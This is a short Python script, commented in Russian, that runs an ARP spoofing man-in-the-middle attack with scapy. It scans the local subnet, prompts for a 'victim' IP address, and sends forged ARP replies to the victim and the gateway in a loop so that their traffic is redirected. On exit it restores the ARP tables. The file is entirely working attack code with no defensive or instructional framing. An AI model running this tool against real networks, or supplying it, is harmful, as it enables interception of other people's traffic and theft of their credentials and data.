import scapy.all as scapy
import time
    
route = scapy.conf.route.route("0.0.0.0")[2] 

while True:
    print(scapy.arping(route +'/24'))
    target = input('Введите ip адрес жертвы (прим: X.X.X.X): ')
    if target != '': break

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=scapy.getmacbyip(destination_ip), psrc=source_ip, hwsrc = scapy.getmacbyip(source_ip))
    scapy.send(packet, count = 4, verbose = False)

sent_pakets_count = 0

try:
    while True: #Отправка arp запросов жертве и маршрутизатору со стороны друг друга
        spoof(route, target)
        spoof(target, route)
        sent_pakets_count += 2
        print ("\r[+] Пакетов отправлено: " + str(sent_pakets_count), end="") 
        time.sleep(2)
        
except KeyboardInterrupt: #Выход из arp таблицы жертвы и закрытие программы
    print("\nБыло зафиксировано CTRL + C ...... Выход.")
    restore(target, route)
    restore(route, target)
